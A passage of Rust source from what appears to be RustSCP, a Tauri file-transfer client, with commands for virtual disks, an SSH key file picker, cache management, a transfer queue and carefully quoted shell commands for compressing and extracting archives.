    state.virtual_disks_mounting.lock().await.remove(session_id);
}

#[tauri::command]
pub async fn get_virtual_disks_status(
    state: tauri::State<'_, AppState>,
) -> Result<Vec<VirtualDiskInfo>, String> {
    let snapshot: Vec<(String, VirtualDiskInfo, Option<String>, u16)> = {
        let disks = state.virtual_disks.lock().await;
        disks
            .iter()
            .map(|(id, server)| {
                (
                    id.clone(),
                    server.info(),
                    server.mount_point().cloned(),
                    server.port(),
                )
            })
            .collect()
    };

    // Every mount point is probed at once, without holding the registry lock.
    let deadline = tokio::time::Instant::now() + MOUNT_PROBE_TIMEOUT;
    let probes: Vec<_> = snapshot
        .into_iter()
        .map(|(id, info, mount_point, port)| {
            let probe = match mount_point {
                Some(mp) if info.is_mounted => Some(tokio::task::spawn_blocking(move || {
                    os_mount_present(&mp, port)
                })),
                _ => None,
            };
            (id, info, port, probe)
        })
        .collect();

    let mut result = Vec::with_capacity(probes.len());
    for (session_id, mut info, port, probe) in probes {
        if let Some(probe) = probe {
            let ejected = matches!(
                tokio::time::timeout_at(deadline, probe).await,
                Ok(Ok(false))
            );
            if ejected {
                info.is_mounted = false;
                retire_ejected_virtual_disk(&state, &session_id, port).await;
            }
        }
        result.push(info);
    }
    Ok(result)
}

#[tauri::command]
pub async fn open_virtual_disk_folder(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<String, String> {
    let disks = state.virtual_disks.lock().await;
    let server = disks.get(&session_id).ok_or_else(|| {
        format!(
            "Disco virtual não encontrado para a conexão '{}'",
            session_id
        )
    })?;

    let mount_point = server
        .mount_point()
        .ok_or_else(|| "Disco virtual não possui ponto de montagem ativo no sistema".to_string())?
        .clone();
    let port = server.port();
    drop(disks);

    if !virtual_disk_still_mounted(mount_point.clone(), port).await {
        retire_ejected_virtual_disk(&state, &session_id, port).await;
        return Err("The virtual disk was ejected outside RustSCP; mount it again".to_string());
    }

    #[cfg(target_os = "macos")]
    {
        tokio::process::Command::new("open")
            .arg(&mount_point)
            .spawn()
            .map_err(|e| format!("Falha ao abrir no Finder: {}", e))?;
        return Ok(format!("Aberto no Finder: {}", mount_point));
    }

    #[cfg(target_os = "windows")]
    {
        tokio::process::Command::new("explorer")
            .arg(&mount_point)
            .spawn()
            .map_err(|e| format!("Falha ao abrir no Windows Explorer: {}", e))?;
        return Ok(format!("Aberto no Windows Explorer: {}", mount_point));
    }

    #[cfg(target_os = "linux")]
    {
        tokio::process::Command::new("xdg-open")
            .arg(&mount_point)
            .spawn()
            .map_err(|e| format!("Falha ao abrir no gerenciador de arquivos: {}", e))?;
        return Ok(format!(
            "Aberto no Gerenciador de Arquivos: {}",
            mount_point
        ));
    }

    #[allow(unreachable_code)]
    Ok(format!("Ponto de montagem: {}", mount_point))
}

#[tauri::command]
pub async fn pick_key_file() -> Result<Option<String>, String> {
    tokio::task::spawn_blocking(|| -> Result<Option<String>, String> {
        #[cfg(target_os = "macos")]
        {
            let script = r#"
            try
                set keyFile to choose file invisibles true with prompt "Selecione o arquivo de chave privada SSH ou certificado"
                return POSIX path of keyFile
            on error
                return ""
            end try
            "#;
            let output = std::process::Command::new("osascript")
                .arg("-e")
                .arg(script)
                .output()
                .map_err(|e| format!("Falha ao abrir seletor de arquivos nativo: {}", e))?;

            if output.status.success() {
                let path = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if path.is_empty() {
                    Ok(None)
                } else {
                    Ok(Some(path))
                }
            } else {
                Ok(None)
            }
        }

        #[cfg(target_os = "windows")]
        {
            let script = r#"
            Add-Type -AssemblyName System.Windows.Forms
            $f = New-Object System.Windows.Forms.OpenFileDialog
            $f.Title = "Selecione a Chave Privada (SSH) ou Certificado"
            $f.Filter = "Todos os Arquivos (*.*)|*.*|Chaves Privadas (*.pem;*.key;*.id_*)|*.pem;*.key;*.id_*"
            if ($f.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
                Write-Output $f.FileName
            }
            "#;
            let output = std::process::Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-Command", script])
                .output()
                .map_err(|e| format!("Falha ao abrir seletor de arquivos nativo: {}", e))?;

            if output.status.success() {
                let path = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if path.is_empty() {
                    Ok(None)
                } else {
                    Ok(Some(path))
                }
            } else {
                Ok(None)
            }
        }

        #[cfg(target_os = "linux")]
        {
            let output = std::process::Command::new("zenity")
                .args(["--file-selection", "--title=Selecione a Chave Privada (SSH) ou Certificado"])
                .output();

            if let Ok(out) = output {
                if out.status.success() {
                    let path = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    if !path.is_empty() {
                        return Ok(Some(path));
                    }
                }
            }
            Ok(None)
        }

        #[cfg(not(any(target_os = "macos", target_os = "windows", target_os = "linux")))]
        {
            Ok(None)
        }
    })
    .await
    .map_err(|e| e.to_string())?
}

// ---------------------- LOCAL DISK & SHADOW CATALOG CACHE ----------------------

#[tauri::command]
pub async fn get_cache_stats(state: tauri::State<'_, AppState>) -> Result<CacheStats, String> {
    let configs = state.session_configs.read().await;
    let mut session_names = HashMap::new();
    for (id, cfg) in configs.iter() {
        session_names.insert(id.clone(), cfg.name.clone());
    }
    drop(configs);
    Ok(state.disk_cache.get_stats(&session_names).await)
}

#[tauri::command]
pub async fn clear_site_cache(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<(), String> {
    require_valid_session_id(&session_id)?;
    state
        .disk_cache
        .clear_session(&session_id)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn clear_all_cache(state: tauri::State<'_, AppState>) -> Result<(), String> {
    state
        .disk_cache
        .clear_all()
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn set_max_cache_size(
    state: tauri::State<'_, AppState>,
    max_bytes: u64,
) -> Result<(), String> {
    state.disk_cache.set_max_size(max_bytes).await;
    Ok(())
}

// ---------------------- BACKGROUND ASYNC TRANSFER QUEUE ----------------------

#[tauri::command]
pub async fn enqueue_transfer(
    state: tauri::State<'_, AppState>,
    source_session: String,
    source_path: String,
    dest_session: String,
    dest_path: String,
    is_move: bool,
) -> Result<String, String> {
    // Two sessions on the same server (e.g. one saved site connected in both panes) see
    // the same files under different ids; the queue only knows about the same id.
    if source_session != dest_session {
        reject_self_transfer(
            &state,
            &source_session,
            &source_path,
            &dest_session,
            &dest_path,
        )
        .await?;
    }
    let task_id = state
        .transfer_queue
        .enqueue(
            source_session,
            source_path,
            dest_session,
            dest_path,
            is_move,
            state.active_sessions.clone(),
        )
        .await;

    Ok(task_id)
}

#[tauri::command]
pub async fn get_transfer_queue_tasks(
    state: tauri::State<'_, AppState>,
) -> Result<Vec<QueueTransferTask>, String> {
    Ok(state.transfer_queue.get_tasks().await)
}

#[tauri::command]
pub async fn cancel_transfer_task(
    state: tauri::State<'_, AppState>,
    task_id: String,
) -> Result<(), String> {
    state.transfer_queue.cancel_task(&task_id).await;
    Ok(())
}

#[tauri::command]
pub async fn clear_completed_transfers(state: tauri::State<'_, AppState>) -> Result<(), String> {
    state.transfer_queue.clear_completed().await;
    Ok(())
}

// ---------------------- COMPRESSION & EXTRACTION (ZIP / TAR / GZIP) ----------------------

/// Archive formats handled by compress/extract.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArchiveKind {
    Zip,
    TarGz,
    TarBz2,
    TarXz,
    Tar,
}

impl ArchiveKind {
    /// Format requested by the UI for compression ("zip", "tar.gz", ...); unknown means tar.gz.
    fn from_format(format: &str) -> Self {
        match format {
            "zip" => Self::Zip,
            "tar.bz2" | "tbz2" => Self::TarBz2,
            "tar.xz" | "txz" => Self::TarXz,
            "tar" => Self::Tar,
            _ => Self::TarGz,
        }
    }

    /// Format of an existing archive, from its file name (case-insensitive). Unknown
    /// extensions use plain `tar -xf`, which detects the compression itself; formats tar
    /// cannot read get a clear error.
    fn from_archive_name(path: &str) -> Result<Self, String> {
        let lower = path.to_ascii_lowercase();
        let ends = |suffixes: &[&str]| suffixes.iter().any(|s| lower.ends_with(s));
        if ends(&[".zip"]) {
            Ok(Self::Zip)
        } else if ends(&[".tar.gz", ".tgz"]) {
            Ok(Self::TarGz)
        } else if ends(&[".tar.bz2", ".tbz2", ".tbz"]) {
            Ok(Self::TarBz2)
        } else if ends(&[".tar.xz", ".txz"]) {
            Ok(Self::TarXz)
        } else if ends(&[".7z", ".rar"]) {
            Err(format!(
                "'{}' is a 7z/RAR archive, which RustSCP cannot extract: use 7z or unrar in a terminal",
                archive_item_name(path, false)
            ))
        } else {
            Ok(Self::Tar)
        }
    }

    fn default_output_name(self) -> &'static str {
        match self {
            Self::Zip => "archive.zip",
            Self::TarBz2 => "archive.tar.bz2",
            Self::TarXz => "archive.tar.xz",
            Self::Tar => "archive.tar",
            Self::TarGz => "archive.tar.gz",
        }
    }
}

/// Compressed single files (`notes.txt.gz`), which are decompressed rather than unpacked.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SingleFileCompression {
    Gzip,
    Bzip2,
    Xz,
}

impl SingleFileCompression {
    /// `Some` for `.gz` / `.bz2` / `.xz` files that are not tarballs.
    fn detect(path: &str) -> Option<Self> {
        let lower = path.to_ascii_lowercase();
        if lower.ends_with(".tar.gz") || lower.ends_with(".tar.bz2") || lower.ends_with(".tar.xz") {
            None
        } else if lower.ends_with(".gz") {
            Some(Self::Gzip)
        } else if lower.ends_with(".bz2") {
            Some(Self::Bzip2)
        } else if lower.ends_with(".xz") {
            Some(Self::Xz)
        } else {
            None
        }
    }

    fn extension_len(self) -> usize {
        match self {
            Self::Gzip => 3,
            Self::Bzip2 => 4,
            Self::Xz => 3,
        }
    }

    /// Shell snippet writing the decompressed archive (`{a}`) to stdout.
    fn decompress_snippet(self, a: &str) -> String {
        match self {
            Self::Gzip => format!(
                "if command -v gzip >/dev/null 2>&1; then gzip -dc {a}; \
                 elif command -v pigz >/dev/null 2>&1; then pigz -dc {a}; \
                 else echo 'gzip is not installed' >&2; exit 1; fi"
            ),
            Self::Bzip2 => format!(
                "if command -v bzip2 >/dev/null 2>&1; then bzip2 -dc {a}; \
                 else echo 'bzip2 is not installed' >&2; exit 1; fi"
            ),
            Self::Xz => format!(
                "if command -v xz >/dev/null 2>&1; then xz -dc {a}; \
                 else echo 'xz is not installed' >&2; exit 1; fi"
            ),
        }
    }
}

/// POSIX shell command decompressing a single `.gz`/`.bz2`/`.xz` file into `dest`. The
/// output keeps the name without the extension; an existing file is never replaced unless
/// `overwrite` is set (then it is replaced only once the decompression succeeded).
fn build_single_decompress_command(
    archive: &str,
    dest: &str,
    kind: SingleFileCompression,
    overwrite: bool,
) -> String {
    let name = archive_item_name(archive, false);
    let stem = name[..name.len().saturating_sub(kind.extension_len())].to_string();
    let stem = if stem.is_empty() || stem == "." || stem == ".." {
        "decompressed".to_string()
    } else {
        stem
    };
    let out_path = format!("{}/{}", dest.trim_end_matches('/'), stem);
    let a = sh_quote(&safe_operand(archive));
    let d = sh_quote(&safe_operand(dest));
    let o = sh_quote(&safe_operand(&out_path));
    let snippet = kind.decompress_snippet(&a);
    if overwrite {
        let t = sh_quote(&safe_operand(&format!("{out_path}.rustscp-partial")));
        return format!(
            "mkdir -p {d} && if [ -d {o} ]; then echo {is_dir} >&2; exit 1; fi; \
             ( {snippet} ) > {t} && mv -f -- {t} {o} || {{ rm -f -- {t}; exit 1; }}",
            is_dir = sh_quote(&format!("'{}' is a folder", out_path)),
        );
    }
    format!(
        "mkdir -p {d} && if [ -e {o} ]; then echo {exists} >&2; exit 1; fi; \
         ( {snippet} ) > {o} || {{ rm -f -- {o}; exit 1; }}",
        exists = sh_quote(&format!("'{}' already exists", out_path)),
    )
}

/// Error text for a failed archive command: stderr, else stdout, else the exit code.
fn command_failure_detail(code: i32, stdout: &str, stderr: &str) -> String {
    if !stderr.trim().is_empty() {
        stderr.trim().to_string()
    } else if !stdout.trim().is_empty() {
        stdout.trim().to_string()
    } else {
        format!("the command exited with code {code}")
    }
}

/// Last path component of a selected item (items are archived relative to `current_dir`).
fn archive_item_name(item: &str, windows_separators: bool) -> String {
    let is_sep = |c: char| c == '/' || (windows_separators && c == '\\');
    let trimmed = item.trim_end_matches(is_sep);
    trimmed.rsplit(is_sep).next().unwrap_or(trimmed).to_string()
}

fn validate_archive_item(name: &str) -> Result<(), String> {
    if name.is_empty() || name == "." || name == ".." || name.contains('\0') {
        return Err(format!("Invalid item name '{}'", name.escape_default()));
    }
    Ok(())
}

/// The archive is created inside the current directory, so its name must be a plain file name.
fn validate_archive_output_name(name: &str) -> Result<(), String> {
    if name.is_empty()
        || name == "."
        || name == ".."
        || name.contains('/')
        || name.contains('\\')
        || has_control_chars(name)
    {
        return Err(format!(
            "Invalid archive name '{}': use a plain file name without '/', '\\' or control characters",
            name.escape_default()
        ));
    }
    Ok(())
}

/// Extraction folder: `current_dir`, or `current_dir/<sub>` for a relative subfolder that
/// cannot climb out of it (no `..` component, no control characters).
fn extraction_target(current_dir: &str, dest_subfolder: Option<&str>) -> Result<String, String> {
    let sub = match dest_subfolder.map(str::trim) {
        Some(s) if !s.is_empty() && s != "." => s,
        _ => return Ok(current_dir.to_string()),
    };
    if has_control_chars(sub) || sub.split(['/', '\\']).any(|part| part == "..") {
        return Err(format!(
            "Invalid destination folder '{}': use a folder name inside the current directory",
            sub.escape_default()
        ));
    }
    let sub = sub.trim_matches('/');
    if sub.is_empty() {
        return Ok(current_dir.to_string());
    }
    Ok(format!("{}/{}", current_dir.trim_end_matches('/'), sub))
}

/// Temporary name an archive is written to before it replaces `output` (same folder, so
/// the final `mv` is a rename). The original name stays last, so `zip` keeps the
/// extension, never appends `.zip` and never merges into an existing archive.
fn partial_archive_name(output: &str) -> String {
    let tag = uuid::Uuid::new_v4().simple().to_string();
    format!(".rustscp-partial-{}-{}", &tag[..8], output)
}

/// POSIX shell command (local `/bin/sh` or the SSH server's shell) that creates `output`
/// from `items` inside `current_dir`. Every interpolated value goes through [`sh_quote`]
/// and operands starting with `-` get a `./` prefix so tools never read them as options.
///
/// The archive is written to `partial` and renamed to `output` only when every tool
/// succeeded, so a failed run leaves no half-written archive and an existing file is
/// never truncated before its replacement is complete. Without `overwrite` an existing
/// `output` is an error ([`E_EXISTS`]); a folder named `output` always is.
fn build_compress_command(
    current_dir: &str,
    items: &[String],
    kind: ArchiveKind,
    output: &str,
    partial: &str,
    overwrite: bool,
) -> String {
    let dir = sh_quote(&safe_operand(current_dir));
    let out = sh_quote(&safe_operand(output));
    let tmp = sh_quote(&safe_operand(partial));
    let files = sh_join(&items.iter().map(|i| safe_operand(i)).collect::<Vec<_>>());
    // A POSIX pipeline only reports its last command, so `tar | pigz` would hide a tar
    // error (an unreadable file) behind pigz's success. `rc` collects tar's status and a
    // marker when the compressor fails: it is exactly "0" only when both succeeded.
    let checked_pipe = |compressor: &str| {
        format!(
            "rc=$( {{ {{ tar -cf - {files}; echo $? >&3; }} | {compressor} > {tmp} || echo {compressor}-failed >&3; }} 3>&1 >&2 ); [ \"$rc\" = 0 ]"
        )
    };
    let create = match kind {
        ArchiveKind::Zip => format!(
            "if command -v zip >/dev/null 2>&1; then zip -r {tmp} {files}; \
             elif command -v python3 >/dev/null 2>&1; then python3 -m zipfile -c {tmp} {files}; \
             else echo 'zip utility not installed' >&2; false; fi"
        ),
        ArchiveKind::TarBz2 => format!("tar -cjf {tmp} {files}"),
        // bsdtar compresses xz itself; GNU tar's -J needs the xz binary anyway.
        ArchiveKind::TarXz => format!(
            "if command -v xz >/dev/null 2>&1; then {}; else tar -cJf {tmp} {files}; fi",
            checked_pipe("xz")
        ),
        ArchiveKind::Tar => format!("tar -cf {tmp} {files}"),
        ArchiveKind::TarGz => format!(
            "if command -v pigz >/dev/null 2>&1; then {}; else tar -czf {tmp} {files}; fi",
            checked_pipe("pigz")
        ),
    };
    let is_dir = sh_quote(&format!(
        "'{output}' is a folder; choose another archive name"
    ));
    let keep_existing = if overwrite {
        String::new()
    } else {
        format!(
            "if [ -e {out} ] || [ -L {out} ]; then echo {exists} >&2; exit 1; fi; ",
            exists = sh_quote(&format!("{E_EXISTS}: '{output}' already exists")),
        )
    };
    format!(
        "cd {dir} || exit 1; if [ -d {out} ]; then echo {is_dir} >&2; exit 1; fi; {keep_existing}\
         if {{ {create}; }}; then mv -f -- {tmp} {out} || {{ rm -f -- {tmp}; exit 1; }}; \
         else rm -f -- {tmp}; exit 1; fi"
    )
}

/// Python fallback for zip extraction without replacing files: `zipfile -e` always
/// overwrites. Archive and destination arrive as `sys.argv`, never in the program text.
const PY_UNZIP_KEEP_EXISTING: &str = "import os, sys, zipfile\n\
z = zipfile.ZipFile(sys.argv[1])\n\
for m in z.infolist():\n    \
    if not os.path.lexists(os.path.join(sys.argv[2], m.filename)):\n        \
        z.extract(m, sys.argv[2])\n";

/// `sh -c` scripts merging a staged extraction (cwd) into `$0` without replacing
/// anything: folders are created, files and links only moved where nothing exists yet.
/// (`cp -n` cannot be used: macOS and newer GNU cp exit 1 whenever they skip a file.)
const MERGE_STAGED_DIRS: &str = r#"for p in "$@"; do mkdir -p -- "$0/$p" || exit 1; done"#;
const MERGE_STAGED_FILES: &str = r#"for p in "$@"; do if [ ! -e "$0/$p" ] && [ ! -L "$0/$p" ]; then mv -- "$p" "$0/$p" || exit 1; fi; done"#;

/// POSIX shell command that extracts `archive` into `dest` (created when missing).
/// With `overwrite` (the default of `extract_archive`) files that already exist in `dest`
/// are replaced; without it they are kept: `unzip -n`, GNU tar `--skip-old-files`,
/// bsdtar `-k`. Other tars (busybox, toybox) stop at the first existing file with `-k`,
/// so they extract into a private temp folder inside `dest` whose contents are then
/// moved over only where nothing exists yet.
fn build_extract_command(archive: &str, dest: &str, kind: ArchiveKind, overwrite: bool) -> String {
    let a = sh_quote(&safe_operand(archive));
    let d = sh_quote(&safe_operand(dest));
    if kind == ArchiveKind::Zip {
        return build_unzip_command(&a, &d, overwrite);
    }
    // `k` is "" or "$K " (`$K` only ever holds one of the fixed flags set below, so it is
    // safe unquoted); `into` is an already quoted folder.
    let extract = |k: &str, into: &str| match kind {
        ArchiveKind::TarBz2 => format!("tar {k}-xjf {a} -C {into}"),
        ArchiveKind::TarXz => format!("(tar {k}-xJf {a} -C {into} || tar {k}-xf {a} -C {into})"),
        ArchiveKind::TarGz => format!(
            "if command -v pigz >/dev/null 2>&1; then pigz -dc {a} | tar {k}-xf - -C {into}; \
             else tar {k}-xzf {a} -C {into}; fi"
        ),
        ArchiveKind::Tar | ArchiveKind::Zip => format!("tar {k}-xf {a} -C {into}"),
    };
    if overwrite {
        return format!("mkdir -p {d} || exit 1; {}", extract("", &d));
    }
    let template = sh_quote(&safe_operand(&format!(
        "{}/.rustscp-extract.XXXXXX",
        dest.trim_end_matches('/')
    )));
    format!(
        "mkdir -p {d} || exit 1; K=; \
         if tar --version 2>/dev/null | grep -q 'GNU tar'; then K=--skip-old-files; \
         elif tar --version 2>/dev/null | grep -q bsdtar; then K=-k; fi; \
         if [ -n \"$K\" ]; then {keep}; else \
         T=$(mktemp -d {template}) || exit 1; {staged}; rc=$?; \
         if [ $rc -eq 0 ]; then ( cd \"$T\" && \
         find . -type d -exec sh -c {dirs} .. {{}} + && \
         find . ! -type d -exec sh -c {files} .. {{}} + ); rc=$?; fi; \
         rm -rf -- \"$T\"; exit $rc; fi",
        keep = extract("$K ", &d),
        staged = extract("", "\"$T\""),
        dirs = sh_quote(MERGE_STAGED_DIRS),
        files = sh_quote(MERGE_STAGED_FILES),
    )
}

/// Zip part of [`build_extract_command`]; `a` and `d` are already [`sh_quote`]d.
fn build_unzip_command(a: &str, d: &str, overwrite: bool) -> String {
    let (unzip_flag, python) = if overwrite {
        ("-o", format!("python3 -m zipfile -e {a} {d}"))
    } else {
        (
            "-n",
            format!("python3 -c {} {a} {d}", sh_quote(PY_UNZIP_KEEP_EXISTING)),
        )
    };
    format!(
        "mkdir -p {d} && if command -v unzip >/dev/null 2>&1; then unzip {unzip_flag} {a} -d {d}; \
         elif command -v python3 >/dev/null 2>&1; then {python}; \
         elif command -v busybox >/dev/null 2>&1; then busybox unzip {unzip_flag} {a} -d {d}; \
         else echo 'unzip utility not installed' >&2; exit 1; fi"
    )
}

/// Arguments for Windows' bundled `tar.exe` (bsdtar) to create an archive. No shell is
/// involved: the values are passed as separate arguments with `current_dir` as cwd.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
fn windows_tar_create_args(kind: ArchiveKind, output: &str, items: &[String]) -> Vec<String> {
    let flags: &[&str] = match kind {
        ArchiveKind::Zip => &["-c", "--format=zip", "-f"],
        ArchiveKind::TarGz => &["-c", "-z", "-f"],
        ArchiveKind::TarBz2 => &["-c", "-j", "-f"],
        ArchiveKind::TarXz => &["-c", "-J", "-f"],
        ArchiveKind::Tar => &["-c", "-f"],
    };
    let mut args: Vec<String> = flags.iter().map(|f| f.to_string()).collect();
    args.push(safe_operand(output));
    args.extend(items.iter().map(|i| safe_operand(i)));
    args
}

/// Arguments for Windows' `tar.exe` to extract any supported archive (zip included).
/// Without `overwrite`, bsdtar's `-k` keeps files that already exist.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
fn windows_tar_extract_args(archive: &str, dest: &str, overwrite: bool) -> Vec<String> {
    let mut args = vec!["-x".to_string()];
    if !overwrite {
        args.push("-k".to_string());
    }
    args.extend([
        "-f".to_string(),
        safe_operand(archive),
        "-C".to_string(),
        safe_operand(dest),
    ]);
    args
}

/// `dir` + `/` + `name` for a path inside a listed folder (local Windows folders accept
/// `/` too).
fn join_dir_name(dir: &str, name: &str) -> String {
    let base = dir.trim_end_matches(['/', '\\']);
    format!("{base}/{name}")
}

#[tauri::command]
pub async fn compress_items(
    state: tauri::State<'_, AppState>,
    session_id: String,
    current_dir: String,
    items: Vec<String>,
    format: String,
    output_name: String,
    overwrite: Option<bool>,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;
    // An existing archive is only replaced when the caller confirmed it.
    let overwrite = overwrite.unwrap_or(false);

    let kind = ArchiveKind::from_format(&format);
    let mut output = if output_name.trim().is_empty() {
        kind.default_output_name().to_string()
    } else {
        output_name.trim().to_string()
    };
    // `zip` itself appends ".zip" to a name without an extension: do it here, so the
    // existence check and the final name agree.
    if kind == ArchiveKind::Zip && !output.contains('.') {
        output.push_str(".zip");
    }
    validate_archive_output_name(&output)?;

    let is_local = vfs.protocol() == Protocol::Local;
    let windows_local = cfg!(target_os = "windows") && is_local;
    let names: Vec<String> = items
        .iter()
        .map(|item| archive_item_name(item, windows_local))
        .collect();
    if names.is_empty() {
        return Err("No items selected for compression".to_string());
    }
    for name in &names {
        validate_archive_item(name)?;
    }
    // Compressing `site.tar.gz` as `site.tar.gz` would replace the input with an archive
    // of itself (tar even truncates it first when piping through pigz).
    if names.iter().any(|n| n.eq_ignore_ascii_case(&output)) {
        return Err(format!(
            "'{output}' is one of the selected items; choose another archive name"
        ));
    }
    // Local Windows folders use tar.exe without a shell; everything else runs a POSIX
    // shell command (local /bin/sh, or the SSH server's shell).
    if !windows_local && !posix_shell_available(&vfs).await {
        return Err(posix_shell_required("Compressing files"));
    }
    match vfs.metadata(&join_dir_name(&current_dir, &output)).await {
        Ok(meta) if meta.is_dir() => {
            return Err(format!(
                "'{output}' is a folder; choose another archive name"
            ))
        }
        Ok(_) if !overwrite => return Err(format!("{E_EXISTS}: '{output}' already exists")),
        _ => {}
    }
    let partial = partial_archive_name(&output);

    #[cfg(target_os = "windows")]
    {
        if is_local {
            // cmd.exe has no safe quoting for arbitrary file names: run tar.exe directly,
            // into the temporary name, and rename it once tar succeeded.
            let dir = std::path::Path::new(&current_dir);
            let partial_path = dir.join(&partial);
            let args = windows_tar_create_args(kind, &partial, &names);
            let (code, stdout, stderr) =
                match run_local_program("tar", &args, Some(&current_dir)).await {
                    Ok(result) => result,
                    Err(e) => {
                        let _ = tokio::fs::remove_file(&partial_path).await;
                        return Err(e);
                    }
                };
            if code != 0 {
                let _ = tokio::fs::remove_file(&partial_path).await;
                return Err(format!(
                    "Compression failed: {}",
                    if stderr.trim().is_empty() {
                        format!("tar exited with code {code}")
                    } else {
                        stderr
                    }
                ));
            }
            // std::fs::rename replaces an existing file on Windows (MOVEFILE_REPLACE_EXISTING).
            if let Err(e) = tokio::fs::rename(&partial_path, dir.join(&output)).await {
                let _ = tokio::fs::remove_file(&partial_path).await;
                return Err(format!(
                    "Compression failed: could not write '{output}': {e}"
                ));
            }
            state
                .disk_cache
                .invalidate_catalog(&session_id, &current_dir)
                .await;
            return Ok(if stdout.is_empty() {
                format!("Archive '{}' created successfully", output)
            } else {
                stdout
            });
        }
    }

    // Local (/bin/sh) on macOS/Linux, or the SSH server's shell for remote sessions.
    let cmd = build_compress_command(&current_dir, &names, kind, &output, &partial, overwrite);
    let (code, stdout, stderr) = match execute_long_command(&vfs, &cmd).await {
        Ok(result) => result,
        Err(e) => {
            // Timed out or the connection dropped: do not leave the partial archive behind.
            let _ = vfs
                .remove_file(&join_dir_name(&current_dir, &partial))
                .await;
            return Err(format!("Compression failed: {e}"));
        }
    };
    // Any non-zero exit is a failure, also when the tool printed nothing (e.g. killed).
    if code != 0 {
        if stderr.contains(E_EXISTS) {
            return Err(format!("{E_EXISTS}: '{output}' already exists"));
        }
        return Err(format!(
            "Compression failed: {}",
            command_failure_detail(code, &stdout, &stderr)
        ));
    }
    state
        .disk_cache
        .invalidate_catalog(&session_id, &current_dir)
        .await;
    Ok(if stdout.is_empty() {
        format!("Archive '{}' created successfully", output)
    } else {
        stdout
    })
}

#[tauri::command]
pub async fn extract_archive(
    state: tauri::State<'_, AppState>,
    session_id: String,
    current_dir: String,
    archive_path: String,
    dest_subfolder: Option<String>,
    overwrite: Option<bool>,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;
    // Existing files are replaced unless the caller asks to keep them (the UI says that
    // files with the same name are replaced).
    let overwrite = overwrite.unwrap_or(true);

    let target_dest = extraction_target(&current_dir, dest_subfolder.as_deref())?;
    if archive_path.trim().is_empty() || archive_path.contains('\0') {
        return Err("Invalid archive path".to_string());
    }
    let single = SingleFileCompression::detect(&archive_path);
    let kind = match single {
        Some(_) => ArchiveKind::Tar,
        None => ArchiveKind::from_archive_name(&archive_path)?,
    };

    #[cfg(target_os = "windows")]
    {
        if vfs.protocol() == Protocol::Local {
            if single.is_some() {
                return Err(
                    "Decompressing a single .gz/.bz2/.xz file is not supported for local Windows folders"
                        .to_string(),
                );
            }
            // tar.exe (bsdtar) extracts zip and tar.* alike; no cmd.exe/PowerShell string.
            tokio::fs::create_dir_all(&target_dest)
                .await
                .map_err(|e| format!("Extraction failed: {}", e))?;
            let args = windows_tar_extract_args(&archive_path, &target_dest, overwrite);
            let (code, stdout, stderr) =
                run_local_program("tar", &args, Some(&current_dir)).await?;
            if code != 0 {
                return Err(format!(
                    "Extraction failed: {}",
                    if stderr.trim().is_empty() {
                        format!("tar exited with code {code}")
                    } else {
                        stderr
                    }
                ));
            }
            state
                .disk_cache
                .invalidate_catalog(&session_id, &target_dest)
                .await;
            state
                .disk_cache
                .invalidate_catalog(&session_id, &current_dir)
                .await;
            return Ok(if stdout.is_empty() {
                "Extracted successfully".to_string()
            } else {
                stdout
            });
        }
    }

    // Local (/bin/sh) on macOS/Linux, or the SSH server's shell for remote sessions.
    if !posix_shell_available(&vfs).await {
        return Err(posix_shell_required("Extracting archives"));
    }
    let cmd = match single {
        Some(compression) => {
            build_single_decompress_command(&archive_path, &target_dest, compression, overwrite)
        }
        None => build_extract_command(&archive_path, &target_dest, kind, overwrite),
    };
    let (code, stdout, stderr) = execute_long_command(&vfs, &cmd)
        .await
        .map_err(|e| format!("Extraction failed: {e}"))?;
    if code != 0 {
        return Err(format!(
            "Extraction failed: {}",
            command_failure_detail(code, &stdout, &stderr)
        ));
    }
    state
        .disk_cache
        .invalidate_catalog(&session_id, &target_dest)
        .await;
    state
        .disk_cache
        .invalidate_catalog(&session_id, &current_dir)
        .await;
    Ok(if stdout.is_empty() {
        "Extracted successfully".to_string()
    } else {
        stdout
    })
}

/// Recursive local copy used by `duplicate_item` (no shell). Fails if `dst` exists.
/// Symlinks are recreated as symlinks on Unix and copied as files elsewhere.
fn copy_dir_recursive(src: &std::path::Path, dst: &std::path::Path) -> std::io::Result<()> {
    std::fs::create_dir(dst)?;
    if let Ok(meta) = std::fs::metadata(src) {
        let _ = std::fs::set_permissions(dst, meta.permissions());
    }
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let file_type = entry.file_type()?;
        let from = entry.path();
        let to = dst.join(entry.file_name());
        if file_type.is_dir() {
            copy_dir_recursive(&from, &to)?;
        } else if file_type.is_symlink() {
            #[cfg(unix)]
            std::os::unix::fs::symlink(std::fs::read_link(&from)?, &to)?;
            #[cfg(not(unix))]
            {
                std::fs::copy(&from, &to)?;
            }
        } else {
            std::fs::copy(&from, &to)?;
        }
    }
    Ok(())
}

/// Splits a file name into stem and extension for `_copy` names: the extension is
/// searched in the name only (never in a parent folder), a leading dot belongs to the
/// name (`.bashrc`), and `.tar.gz`-style double extensions stay together.
fn split_name_extension(name: &str) -> (&str, &str) {
    let lower = name.to_ascii_lowercase();
    for compound in [".tar.gz", ".tar.bz2", ".tar.xz", ".tar.zst"] {
        if lower.len() > compound.len() && lower.ends_with(compound) {
            let at = name.len() - compound.len();
            return (&name[..at], &name[at..]);
        }
    }
    match name.rfind('.') {
        Some(idx) if idx > 0 => (&name[..idx], &name[idx..]),
        _ => (name, ""),
    }
}

/// `n`-th duplicate name for `path`: `dir/name_copy.ext`, then `name_copy2.ext`, ...
/// `windows_separators` also treats `\` as a separator (local Windows paths).
pub(crate) fn duplicate_candidate(
    path: &str,
    is_dir: bool,
    n: u32,
    windows_separators: bool,
